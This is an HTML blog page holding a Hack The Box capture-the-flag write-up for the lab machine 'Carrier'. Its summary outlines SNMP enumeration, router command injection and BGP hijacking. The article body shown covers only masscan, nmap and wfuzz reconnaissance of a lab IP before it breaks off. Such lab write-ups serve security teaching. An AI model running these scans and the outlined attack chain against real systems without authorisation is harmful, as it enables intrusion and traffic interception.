@@ -1,0 +1,1625 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta name="generator" content="Hugo 0.54.0" />
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hack The Box Write-up - Carrier | text/plain</title>
+    <meta name="description" content="Write-up for the machine Carrier from Hack The Box.
+This box is really fun since it allows you to try something yourself that you
+otherwise only hear about in the news. BGP hijacking is required to get the
+root flag. You start by checking out the admin interface of an ISP called
+Lyghtspeed Networks. Fuzzing the web server, you find some documentation on
+error codes which suggest you could log in with default admin credentials.
+However, the password is a serial number of the device. Some UDP port scans
+later you realize there is SNMP running and it spits out this number. Once
+inside the admin interface you read some support tickets. One of them is about
+an important FTP server is a specific network attached to a neighboring AS.
+Also, there is a feature to check router status which turns out to be
+vulnerable to command injection. This vulnerability turns into a shell on the
+router. This was all easy but now the fun begins. You must carefully manipulate
+the route advertisements to direct the traffic to this mysterious FTP server
+over the compromised router. Dumping the traffic reveals the FTP password. The
+root flag is now only one FTP download away. All in all a really interesting
+challenge and a great way to learn more about how the Internet actually works.
+">
+    <meta name="keywords" content="ctf, infosec, hackthebox, write-up, BGP hijacking">
+    
+    
+    
+    
+    
+
+  <meta name="author" content="Dominic Breuker">
+
+
+    <meta property="og:title" content="Hack The Box Write-up - Carrier" />
+<meta property="og:description" content="Write-up for the machine Carrier from Hack The Box.
+This box is really fun since it allows you to try something yourself that you
+otherwise only hear about in the news. BGP hijacking is required to get the
+root flag. You start by checking out the admin interface of an ISP called
+Lyghtspeed Networks. Fuzzing the web server, you find some documentation on
+error codes which suggest you could log in with default admin credentials.
+However, the password is a serial number of the device. Some UDP port scans
+later you realize there is SNMP running and it spits out this number. Once
+inside the admin interface you read some support tickets. One of them is about
+an important FTP server is a specific network attached to a neighboring AS.
+Also, there is a feature to check router status which turns out to be
+vulnerable to command injection. This vulnerability turns into a shell on the
+router. This was all easy but now the fun begins. You must carefully manipulate
+the route advertisements to direct the traffic to this mysterious FTP server
+over the compromised router. Dumping the traffic reveals the FTP password. The
+root flag is now only one FTP download away. All in all a really interesting
+challenge and a great way to learn more about how the Internet actually works.
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://dominicbreuker.com/post/htb_carrier/" />
+
+<meta property="og:image" content="https://source.unsplash.com/category/technology/2000x1322" />
+<meta property="article:published_time" content="2019-03-18T00:00:00&#43;01:00"/>
+<meta property="article:modified_time" content="2019-03-18T00:00:00&#43;01:00"/>
+
+    
+
+
+
+  <meta property="og:image" content="https://source.unsplash.com/category/technology/2000x1322">
+
+
+    <meta name="theme-color" content="#000">
+
+    
+    
+    
+    <link rel="canonical" href="https://dominicbreuker.com/post/htb_carrier/">
+    
+    
+    <link rel="icon" sizes="any" href="data:image/svg+xml,%3Csvg%20viewBox='0%200%2046%2045'%20xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3EAfter%20Dark%3C/title%3E%3Cpath%20d='M.708%2045L23%20.416%2045.292%2045H.708zM35%2038L23%2019%2011%2038h24z'%20fill='%23000'/%3E%3C/svg%3E">
+
+    <style>
+  html{font-size:12px}*{box-sizing:border-box;text-rendering:geometricPrecision}body{font-size:1rem;line-height:1.5rem;margin:0;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif;word-wrap:break-word}h1,h2,h3,h4,h5,h6{line-height:1.3em}fieldset{border:none;padding:0;margin:0}pre{padding:2rem;margin:1.75rem 0;background-color:#fff;border:1px solid #ccc;overflow:auto}code[class*=language-],pre[class*=language-],pre code{font-weight:100;text-shadow:none;margin:1.75rem 0}a{cursor:pointer;color:#ff2e88;text-decoration:none;border-bottom:1px solid #ff2e88}a:hover{background-color:#ff2e88;color:#fff}.grid{display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap}.grid.\-top{-ms-flex-align:start;-ms-grid-row-align:flex-start;align-items:flex-start}.grid.\-middle{-ms-flex-align:center;-ms-grid-row-align:center;align-items:center}.grid.\-bottom{-ms-flex-align:end;-ms-grid-row-align:flex-end;align-items:flex-end}.grid.\-stretch{-ms-flex-align:stretch;-ms-grid-row-align:stretch;align-items:stretch}.grid.\-baseline{-ms-flex-align:baseline;-ms-grid-row-align:baseline;align-items:baseline}.grid.\-left{-ms-flex-pack:start;justify-content:flex-start}.grid.\-center{-ms-flex-pack:center;justify-content:center}.grid.\-right{-ms-flex-pack:end;justify-content:flex-end}.grid.\-between{-ms-flex-pack:justify;justify-content:space-between}.grid.\-around{-ms-flex-pack:distribute;justify-content:space-around}.cell{-ms-flex:1;flex:1;box-sizing:border-box}@media screen and (min-width:768px){.cell.\-1of12{-ms-flex:0 0 8.33333%;flex:0 0 8.33333%}.cell.\-2of12{-ms-flex:0 0 16.66667%;flex:0 0 16.66667%}.cell.\-3of12{-ms-flex:0 0 25%;flex:0 0 25%}.cell.\-4of12{-ms-flex:0 0 33.33333%;flex:0 0 33.33333%}.cell.\-5of12{-ms-flex:0 0 41.66667%;flex:0 0 41.66667%}.cell.\-6of12{-ms-flex:0 0 50%;flex:0 0 50%}.cell.\-7of12{-ms-flex:0 0 58.33333%;flex:0 0 58.33333%}.cell.\-8of12{-ms-flex:0 0 66.66667%;flex:0 0 66.66667%}.cell.\-9of12{-ms-flex:0 0 75%;flex:0 0 75%}.cell.\-10of12{-ms-flex:0 0 83.33333%;flex:0 0 83.33333%}.cell.\-11of12{-ms-flex:0 0 91.66667%;flex:0 0 91.66667%}}@media screen and (max-width:768px){.grid{-ms-flex-direction:column;flex-direction:column}.cell{-ms-flex:0 0 auto;flex:0 0 auto}}.hack,.hack blockquote,.hack code,.hack em,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack strong{font-size:1rem;font-style:normal;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif}.hack blockquote,.hack code,.hack em,.hack strong{line-height:20px}.hack blockquote,.hack code,.hack footer,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack header,.hack li,.hack ol,.hack p,.hack section,.hack ul{float:none;margin:0;padding:0}.hack blockquote,.hack h1,.hack ol,.hack p,.hack ul{margin-top:20px;margin-bottom:20px}.hack h1{position:relative;display:inline-block;display:table-cell;padding:20px 0 30px;margin:0;overflow:hidden}.hack h1:after{content:"====================================================================================================";position:absolute;bottom:10px;left:0}.hack h1+*{margin-top:0}.hack h2,.hack h3,.hack h4,.hack h5,.hack h6{position:relative;margin-bottom:1.75rem}.hack h2:before,.hack h3:before,.hack h4:before,.hack h5:before,.hack h6:before{display:inline}.hack h2:before{content:"## "}.hack h3:before{content:"### "}.hack h4:before{content:"#### "}.hack h5:before{content:"##### "}.hack h6:before{content:"###### "}.hack li{position:relative;display:block;padding-left:20px}.hack li:after{position:absolute;top:0;left:0}.hack ul>li:after{content:"-"}.hack ol{counter-reset:a}.hack ol>li:after{content:counter(a) ".";counter-increment:a}.hack blockquote{position:relative;padding-left:17px;padding-left:2ch;overflow:hidden}.hack blockquote:after{content:">\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>";white-space:pre;position:absolute;top:0;left:0;line-height:20px}.hack em:after,.hack em:before{content:"*";display:inline}.hack pre code:after,.hack pre code:before{content:''}.hack code{font-weight:700}.hack code:after,.hack code:before{content:"`";display:inline}.hack hr{position:relative;height:20px;overflow:hidden;border:0;margin:20px 0}.hack hr:after{content:"----------------------------------------------------------------------------------------------------";position:absolute;top:0;left:0;line-height:20px;width:100%;word-wrap:break-word}@-moz-document url-prefix(){.hack h1{display:block}}.hack-ones ol>li:after{content:"1."}p{margin:0 0 1.75rem}.container{max-width:70rem}.container,.container-fluid{margin:0 auto;padding:0 1rem}.inner{padding:1rem}.inner2x{padding:2rem}.pull-left{float:left}.pull-right{float:right}.progress-bar{height:8px;opacity:.8;background-color:#ccc;margin-top:12px}.progress-bar.progress-bar-show-percent{margin-top:38px}.progress-bar-filled{background-color:gray;height:100%;transition:width .3s ease;position:relative;width:0}.progress-bar-filled:before{content:'';border:6px solid transparent;border-top-color:gray;position:absolute;top:-12px;right:-6px}.progress-bar-filled:after{color:gray;content:attr(data-filled);display:block;font-size:12px;white-space:nowrap;position:absolute;border:6px solid transparent;top:-38px;right:0;-ms-transform:translateX(50%);transform:translateX(50%)}table{width:100%;border-collapse:collapse;margin:1.75rem 0;color:#778087}table td,table th{vertical-align:top;border:1px solid #ccc;line-height:15px;padding:10px}table thead th{font-size:10px}table tbody td:first-child{font-weight:700;color:#333}.form{width:30rem}.form-group{margin-bottom:1.75rem;overflow:auto}.form-group label{border-bottom:2px solid #ccc;color:#333;width:10rem;display:inline-block;height:38px;line-height:38px;padding:0;float:left;position:relative}.form-group.form-success label{color:#4caf50!important;border-color:#4caf50!important}.form-group.form-warning label{color:#ff9800!important;border-color:#ff9800!important}.form-group.form-error label{color:#f44336!important;border-color:#f44336!important}.form-control{outline:none;border:none;border-bottom:2px solid #ccc;padding:.5rem 0;width:20rem;height:38px;background-color:transparent}.form-control:focus{border-color:#555}.form-group.form-textarea label:after{position:absolute;content:'';width:2px;background-color:#fff;right:-2px;top:0;bottom:0}textarea.form-control{height:auto;resize:none;padding:1rem 0;border-bottom:2px solid #ccc;border-left:2px solid #ccc;padding:.5rem}select.form-control{border-radius:0;background-color:transparent;-webkit-appearance:none;-moz-appearance:none;-ms-appearance:none}.help-block{color:#999;margin-top:.5rem}.form-actions{margin-bottom:1.75rem}.btn{display:-ms-inline-flexbox;display:inline-flex;-ms-flex-align:center;align-items:center;-ms-flex-pack:center;justify-content:center;cursor:pointer;outline:none;padding:.65rem 2rem;font-size:1rem;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;position:relative;z-index:1}.btn:active{box-shadow:inset 0 1px 3px rgba(0,0,0,.12)}.btn.btn-ghost{border-color:#757575;color:#757575;background-color:transparent}.btn.btn-ghost:focus,.btn.btn-ghost:hover{border-color:#424242;color:#424242;z-index:2}.btn.btn-ghost:hover{background-color:transparent}.btn-block{width:100%;display:-ms-flexbox;display:flex}.btn-default{color:#fff;background-color:#e0e0e0;border:1px solid #e0e0e0;color:#333}.btn-default:focus:not(.btn-ghost),.btn-default:hover{background-color:#dcdcdc;border-color:#dcdcdc}.btn-success{color:#fff;background-color:#4caf50;border:1px solid #4caf50}.btn-success:focus:not(.btn-ghost),.btn-success:hover{background-color:#43a047;border-color:#43a047}.btn-success.btn-ghost{border-color:#4caf50;color:#4caf50}.btn-success.btn-ghost:focus,.btn-success.btn-ghost:hover{border-color:#388e3c;color:#388e3c;z-index:2}.btn-error{color:#fff;background-color:#f44336;border:1px solid #f44336}.btn-error:focus:not(.btn-ghost),.btn-error:hover{background-color:#e53935;border-color:#e53935}.btn-error.btn-ghost{border-color:#f44336;color:#f44336}.btn-error.btn-ghost:focus,.btn-error.btn-ghost:hover{border-color:#d32f2f;color:#d32f2f;z-index:2}.btn-warning{color:#fff;background-color:#ff9800;border:1px solid #ff9800}.btn-warning:focus:not(.btn-ghost),.btn-warning:hover{background-color:#fb8c00;border-color:#fb8c00}.btn-warning.btn-ghost{border-color:#ff9800;color:#ff9800}.btn-warning.btn-ghost:focus,.btn-warning.btn-ghost:hover{border-color:#f57c00;color:#f57c00;z-index:2}.btn-info{color:#fff;background-color:#00bcd4;border:1px solid #00bcd4}.btn-info:focus:not(.btn-ghost),.btn-info:hover{background-color:#00acc1;border-color:#00acc1}.btn-info.btn-ghost{border-color:#00bcd4;color:#00bcd4}.btn-info.btn-ghost:focus,.btn-info.btn-ghost:hover{border-color:#0097a7;color:#0097a7;z-index:2}.btn-primary{color:#fff;background-color:#2196f3;border:1px solid #2196f3}.btn-primary:focus:not(.btn-ghost),.btn-primary:hover{background-color:#1e88e5;border-color:#1e88e5}.btn-primary.btn-ghost{border-color:#2196f3;color:#2196f3}.btn-primary.btn-ghost:focus,.btn-primary.btn-ghost:hover{border-color:#1976d2;color:#1976d2;z-index:2}.btn-group{overflow:auto}.btn-group .btn{float:left}.btn-group .btn-ghost:not(:first-child){margin-left:-1px}.card{border:1px solid #ccc}.card .card-header{color:#333;text-align:center;background-color:#ddd;padding:.5rem 0}.alert{color:#ccc;padding:1rem;border:1px solid #ccc;margin-bottom:1.75rem}.alert-success{color:#4caf50;border-color:#4caf50}.alert-error{color:#f44336;border-color:#f44336}.alert-info{color:#00bcd4;border-color:#00bcd4}.alert-warning{color:#ff9800;border-color:#ff9800}.media:not(:last-child){margin-bottom:1.25rem}.media-left{padding-right:1rem}.media-left,.media-right{display:table-cell;vertical-align:top}.media-right{padding-left:1rem}.media-body{display:table-cell;vertical-align:top}.media-heading{font-size:1.16667rem;font-weight:700}.media-content{margin-top:.3rem}.avatarholder,.placeholder{background-color:#f0f0f0;text-align:center;color:#b9b9b9;font-size:1rem;border:1px solid #f0f0f0}.avatarholder{width:48px;height:48px;line-height:46px;font-size:2rem;background-size:cover;background-position:50%;background-repeat:no-repeat}.avatarholder.rounded{border-radius:33px}.loading{display:inline-block;content:'&nbsp;';height:20px;width:20px;margin:0 .5rem;animation:a .6s infinite linear;border:2px solid #e91e63;border-right-color:transparent;border-radius:50%}.btn .loading{margin-bottom:0;width:14px;height:14px}.btn div.loading{float:left}.alert .loading{margin-bottom:-5px}@keyframes a{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}.menu{width:100%}.menu .menu-item{display:block;color:#616161;border-color:#616161}.menu .menu-item.active,.menu .menu-item:hover{color:#000;border-color:#000;background-color:transparent}@media screen and (max-width:768px){.form-group label{display:block;border-bottom:none;width:100%}.form-group.form-textarea label:after{display:none}.form-control{width:100%}textarea.form-control{border-left:none;padding:.5rem 0}pre::-webkit-scrollbar{height:3px}}@media screen and (max-width:480px){.form{width:100%}}.dark{color:#ccc}.dark,.dark pre{background-color:#000}.dark pre{padding:0;border:none}.dark pre code{color:#00bcd4}.dark h1 a,.dark h2 a,.dark h3 a,.dark h4 a,.dark h5 a{color:#ccc}.dark code,.dark strong{color:#fff}.dark code{font-weight:100}.dark table{color:#ccc}.dark table td,.dark table th{border-color:#444}.dark table tbody td:first-child{color:#fff}.dark .form-group label{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .form-group.form-textarea label:after{background-color:#000}.dark .form-control{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .form-control:focus{border-color:#ccc;color:#ccc}.dark textarea.form-control{color:#ccc}.dark .card{border-color:rgba(95,95,95,.78)}.dark .card .card-header{background-color:transparent;color:#ccc;border-bottom:1px solid rgba(95,95,95,.78)}.dark .btn.btn-ghost.btn-default{border-color:#ababab;color:#ababab}.dark .btn.btn-ghost.btn-default:focus,.dark .btn.btn-ghost.btn-default:hover{border-color:#9c9c9c;color:#9c9c9c;z-index:1}.dark .btn.btn-ghost.btn-default:focus,.dark .btn.btn-ghost.btn-default:hover{border-color:#e0e0e0;color:#e0e0e0}.dark .btn.btn-ghost.btn-primary:focus,.dark .btn.btn-ghost.btn-primary:hover{border-color:#64b5f6;color:#64b5f6}.dark .btn.btn-ghost.btn-success:focus,.dark .btn.btn-ghost.btn-success:hover{border-color:#81c784;color:#81c784}.dark .btn.btn-ghost.btn-info:focus,.dark .btn.btn-ghost.btn-info:hover{border-color:#4dd0e1;color:#4dd0e1}.dark .btn.btn-ghost.btn-error:focus,.dark .btn.btn-ghost.btn-error:hover{border-color:#e57373;color:#e57373}.dark .btn.btn-ghost.btn-warning:focus,.dark .btn.btn-ghost.btn-warning:hover{border-color:#ffb74d;color:#ffb74d}.dark .avatarholder,.dark .placeholder{background-color:transparent;border-color:#333}.dark .menu .menu-item{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .menu .menu-item.active,.dark .menu .menu-item:hover{color:#fff;border-color:#ccc}
+  :root {
+  --screen-size-small: 30em; /* breakpoint reference only */
+}
+@keyframes intro {
+  0% {
+    opacity: 0;
+  }
+  100% {
+    opacity: 1;
+  }
+}
+.muted {
+  color: rgba(255, 255, 255, 0.5);
+}
+.readmore {
+  margin-bottom: 2.2em;
+}
+.responsive-iframe {
+  position: relative;
+  padding-bottom: 56.25%; /* 16:9 */
+  padding-top: 25px;
+  height: 0;
+}
+.responsive-iframe iframe {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+}
+iframe {
+  border: 0;
+}
+main, footer {
+  animation: intro 0.3s both;
+  animation-delay: 0.15s;
+}
+footer time[datetime$="M"]:before {
+  content: "\2013\0020";
+}
+@media only screen
+  and ( max-width: 30em ) {
+  footer time[datetime$="M"] {
+    display: none;
+  }
+}
+blockquote cite {
+  display: block;
+}
+blockquote cite::before {
+   content: "\2014";
+}
+:target {
+  color: #fff;
+}
+/* hack.css overrides and enhancements */
+.hack li ul {
+  margin: 0;
+}
+.main {
+  padding: 20px 10px;
+}
+nav a.active {
+  background-color: #ff2e88;
+  color: #fff;
+}
+a[itemprop="url"] {
+  color: #ff9800;
+}
+a[itemprop="url"]:hover {
+  color: #fff;
+}
+a[href*="://"]::after,
+a[rel*="external"] {
+  content: " " url("data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20class='i-external'%20viewBox='0%200%2032%2032'%20width='14'%20height='14'%20fill='none'%20stroke='%23ff9800'%20stroke-linecap='round'%20stroke-linejoin='round'%20stroke-width='9.38%'%3E%3Cpath%20d='M14%209%20L3%209%203%2029%2023%2029%2023%2018%20M18%204%20L28%204%2028%2014%20M28%204%20L14%2018'/%3E%3C/svg%3E");
+}
+figure a[href*="://"]::after,
+figure a[rel*="external"] {
+  content: "";
+}
+html {
+  font-size: 13px;
+}
+.hack pre {
+  font-size: 17px;
+}
+article [itemprop="description"] {
+  margin-bottom: 20px;
+  margin-top: 20px;
+}
+@media screen and (min-width: 768px) {
+  html {
+    font-size: 1em;
+  }
+  .container {
+    max-width: 50rem;
+  }
+}
+
+  nav a.active {
+  background-color: #33cc33; /*ff2e88*/
+  color: #fff;
+}
+a[itemprop="url"] {
+  color: #339933; /*ff9800*/
+}
+a[itemprop="url"]:hover {
+  color: #fff;
+  background-color: #33cc33; /*ff2e88*/
+}
+
+.dark pre code {
+  color: #248f24;
+}
+
+.dark code {
+  color: #248f24;
+}
+
+a {
+  color: #339933; /*ff9800*/
+  border-bottom: 1px solid #33cc33;
+}
+
+a:hover {
+  color: #fff;
+  background-color: #33cc33; /*ff2e88*/
+}
+
+/* custom styles */
+figure {
+  margin-left: auto;
+  margin-right: auto;
+  text-align: center;
+}
+figure img {
+  max-width: 100%;
+}
+figure a {
+  border-bottom: none !important;
+}
+figure a:hover {
+  background-color: inherit !important;
+}
+
+</style>
+
+    
+    
+      <script async src="/js/lazysizes.min.js"></script>
+    
+    
+      <script async src="/js/bpgdec8a.js"></script>
+      <script async src="/js/bpgdec8.js"></script>
+      <script async src="/js/bpgdec.js"></script>
+    
+  </head>
+  
+  <body class="hack dark main container">
+    <header>
+  
+  <nav itemscope itemtype="http://schema.org/SiteNavigationElement">
+    
+    
+      <a itemprop="url" class="" href="/"><span itemprop="name">Home</span></a>
+    
+      <a itemprop="url" class="active" href="/post/"><span itemprop="name">Post</span></a>
+    
+      <a itemprop="url" class="" href="/about/"><span itemprop="name">About</span></a>
+    
+  </nav>
+
+
+</header>
+    <main>
+  <article itemscope itemtype="http://schema.org/BlogPosting">
+    
+<meta itemprop="name" content="Hack The Box Write-up - Carrier">
+<meta itemprop="description" content="Write-up for the machine Carrier from Hack The Box.
+This box is really fun since it allows you to try something yourself that you
+otherwise only hear about in the news. BGP hijacking is required to get the
+root flag. You start by checking out the admin interface of an ISP called
+Lyghtspeed Networks. Fuzzing the web server, you find some documentation on
+error codes which suggest you could log in with default admin credentials.
+However, the password is a serial number of the device. Some UDP port scans
+later you realize there is SNMP running and it spits out this number. Once
+inside the admin interface you read some support tickets. One of them is about
+an important FTP server is a specific network attached to a neighboring AS.
+Also, there is a feature to check router status which turns out to be
+vulnerable to command injection. This vulnerability turns into a shell on the
+router. This was all easy but now the fun begins. You must carefully manipulate
+the route advertisements to direct the traffic to this mysterious FTP server
+over the compromised router. Dumping the traffic reveals the FTP password. The
+root flag is now only one FTP download away. All in all a really interesting
+challenge and a great way to learn more about how the Internet actually works.
+">
+
+
+<meta itemprop="datePublished" content="2019-03-18T00:00:00&#43;01:00" />
+<meta itemprop="dateModified" content="2019-03-18T00:00:00&#43;01:00" />
+<meta itemprop="wordCount" content="5138">
+
+
+
+<meta itemprop="keywords" content="ctf,infosec,hackthebox,write-up,BGP hijacking," />
+
+    <script async src="/js/baffle.js"></script>
+    <header>
+      <h1 class="baffle" itemprop="headline">Hack The Box Write-up - Carrier</h1>
+      <p class="muted">
+        <svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <circle cx="16" cy="16" r="14" />
+  <path d="M16 8 L16 16 20 20" />
+</svg>
+<span>25 minute read</span>
+<svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z" />
+</svg>
+
+  Published: <time datetime="2019-03-18T00:00:00&#43;01:00">18 Mar, 2019</time>
+
+
+      </p>
+    </header>
+    
+      <blockquote itemprop="description">Write-up for the machine Carrier from Hack The Box.
+This box is really fun since it allows you to try something yourself that you
+otherwise only hear about in the news. BGP hijacking is required to get the
+root flag. You start by checking out the admin interface of an ISP called
+Lyghtspeed Networks. Fuzzing the web server, you find some documentation on
+error codes which suggest you could log in with default admin credentials.
+However, the password is a serial number of the device. Some UDP port scans
+later you realize there is SNMP running and it spits out this number. Once
+inside the admin interface you read some support tickets. One of them is about
+an important FTP server is a specific network attached to a neighboring AS.
+Also, there is a feature to check router status which turns out to be
+vulnerable to command injection. This vulnerability turns into a shell on the
+router. This was all easy but now the fun begins. You must carefully manipulate
+the route advertisements to direct the traffic to this mysterious FTP server
+over the compromised router. Dumping the traffic reveals the FTP password. The
+root flag is now only one FTP download away. All in all a really interesting
+challenge and a great way to learn more about how the Internet actually works.
+</blockquote>
+    
+    
+  <details>
+    <summary>Table of Contents</summary>
+    <nav id="TableOfContents">
+<ul>
+<li><a href="#port-scans">Port scans</a></li>
+<li><a href="#web-server">Web server</a>
+<ul>
+<li><a href="#scanning">Scanning</a></li>
+<li><a href="#exploring">Exploring</a></li>
+</ul></li>
+<li><a href="#snmp-enumeration">SNMP enumeration</a></li>
+<li><a href="#inside-the-admin-area">Inside the admin area</a>
+<ul>
+<li><a href="#tickets">Tickets</a></li>
+<li><a href="#diagnostics">Diagnostics</a></li>
+</ul></li>
+<li><a href="#shell-on-the-box">Shell on the box</a>
+<ul>
+<li><a href="#finding-quagga">Finding Quagga</a></li>
+<li><a href="#exploring-quagga">Exploring Quagga</a></li>
+<li><a href="#bgp-hijacking">BGP hijacking</a>
+<ul>
+<li><a href="#background-on-bgp">Background on BGP</a></li>
+<li><a href="#performing-the-attack">Performing the attack</a></li>
+</ul></li>
+<li><a href="#ftp-login">FTP login</a></li>
+</ul></li>
+<li><a href="#bonus">Bonus</a>
+<ul>
+<li><a href="#ssh-to-ftp-server">SSH to FTP server</a></li>
+</ul></li>
+<li><a href="#references">References</a></li>
+</ul>
+</nav>
+  </details>
+  <script>
+    const el = document.querySelector('details summary')
+    el.onclick = () => {
+      (function(l,o,a,d,e,r){e=o.createElement(a),r=o.getElementsByTagName(a)[0];e.async=1;e.src=d;r.parentNode.insertBefore(e,r)})(window,document,'script','/js/smoothscroll.js');
+      el.onclick = null
+    }
+    document.querySelectorAll('#TableOfContents a').forEach(link => {
+      link.addEventListener('click', () => {
+        document.querySelector(
+          link.href.slice(link.href.indexOf('#'))
+        ).scrollIntoView({ behavior: 'smooth' })
+      })
+    })
+  </script>
+
+
+    <div itemprop="articleBody">
+      
+
+<h1 id="port-scans">Port scans</h1>
+
+<p>A fast <a href="https://github.com/robertdavidgraham/masscan">masscan</a> scan returns only two open ports:</p>
+
+<pre><code> $ masscan -e tun0 -p 1-65535 --rate 2000 10.10.10.105
+...
+Discovered open port 80/tcp on 10.10.10.105
+Discovered open port 22/tcp on 10.10.10.105
+</code></pre>
+
+<p>With nmap we can see we are in front of a Ubuntu Linux box with OpenSSH and
+Apache web servers running. Version 2.4.18 of Apache suggests the box is likely
+Ubuntu Xenial (<a href="https://launchpad.net/ubuntu/+source/apache2">click</a>):</p>
+
+<pre><code> $ nmap -sV -sC -p 22,80 10.10.10.105
+...
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 15:a4:28:77:ee:13:07:06:34:09:86:fd:6f:cc:4c:e2 (RSA)
+|   256 37:be:de:07:0f:10:bb:2b:b5:85:f7:9d:92:5e:83:25 (ECDSA)
+|_  256 89:5a:ee:1c:22:02:d2:13:40:f2:45:2e:70:45:b0:c4 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Login
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+...
+</code></pre>
+
+<p>Interestingly, there is also an open UDP port serving SNMP via <a href="https://github.com/etingof/pysnmp">pysnmp</a>:</p>
+
+<pre><code> $ nmap -sU -sV -sC 10.10.10.105
+PORT      STATE         SERVICE VERSION
+67/udp    open|filtered dhcps
+161/udp   open          snmp    SNMPv1 server; pysnmp SNMPv3 server (public)
+| snmp-info:
+|   enterprise: pysnmp
+|   engineIDFormat: octets
+|   engineIDData: 77656201e96908
+|   snmpEngineBoots: 2
+|_  snmpEngineTime: 2d11h10m27s
+18666/udp open|filtered unknown
+</code></pre>
+
+<p>Although masscan worked pretty well for me so far, it did not discover the UDP
+port on this box. Repeated runs and lower speeds did not change a thing
+about that. Sometimes it&rsquo;s worth to shoot an nmap scan even if masscan does not
+find anything.</p>
+
+<h1 id="web-server">Web server</h1>
+
+<h2 id="scanning">Scanning</h2>
+
+<p>First things first: run some fuzzing on the web server to discover hidden
+directories. I like <a href="https://github.com/xmendez/wfuzz">wfuzz</a>:</p>
+
+<pre><code> $ wfuzz --hc=404 -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.105/FUZZ
+...
+==================================================================
+ID      Response   Lines      Word         Chars          Payload
+==================================================================
+
+000039:  C=301      9 L       28 W          310 Ch        &quot;img&quot;
+000121:  C=301      9 L       28 W          312 Ch        &quot;tools&quot;
+000222:  C=301      9 L       28 W          310 Ch        &quot;doc&quot;
+000550:  C=301      9 L       28 W          310 Ch        &quot;css&quot;
+000953:  C=301      9 L       28 W          309 Ch        &quot;js&quot;
+002771:  C=301      9 L       28 W          312 Ch        &quot;fonts&quot;
+005711:  C=301      9 L       28 W          312 Ch        &quot;debug&quot;
+</code></pre>
+
+<p>A similar scan can be run to ensure we don&rsquo;t miss interesting files:</p>
+
+<pre><code> $ wfuzz --hc=404 -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z list,txt-pdf-php http://10.10.10.105/FUZZ.FUZ2Z
+000045:  C=200     63 L      105 W         1509 Ch        &quot;index - php&quot;
+007071:  C=302      0 L        0 W            0 Ch        &quot;tickets - php&quot;
+008781:  C=302      0 L        0 W            0 Ch        &quot;dashboard - php&quot;
+057168:  C=302      0 L        0 W            0 Ch        &quot;diag - php&quot;
+</code></pre>
+
+<h2 id="exploring">Exploring</h2>
+
+<p>With those scans running, we can open a browser and check things out manually.
+The first thing you see is a login page for a &ldquo;Lygthspeed&rdquo; system:</p>
+
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/19_htb_carrier/htb_carrier_login_page.jpg"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Login Page</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+
+<p>What immediately catches attention are the two red error messages displayed
+above the login form. Keep these error codes in mind since they will be
+important. For now, we can only try a few simple usernames and passwords but
+none of them get us past the login.</p>
+
+<p>The scans reveal some interesting directories to check out. Besides expected
+directories such as &ldquo;img&rdquo;, &ldquo;css&rdquo; and the like, there is &ldquo;debug&rdquo;, &ldquo;tools&rdquo; and &ldquo;doc&rdquo;. At
+<a href="http://10.10.10.105/debug">http://10.10.10.105/debug</a> we find a PHP info page
+telling us more about the PHP configuration (version 7.0.30).
+The page <a href="http://10.10.10.105/tools/remote.php">http://10.10.10.105/tools/remote.php</a>
+simply says &ldquo;License expired, exiting&hellip;&rdquo;.
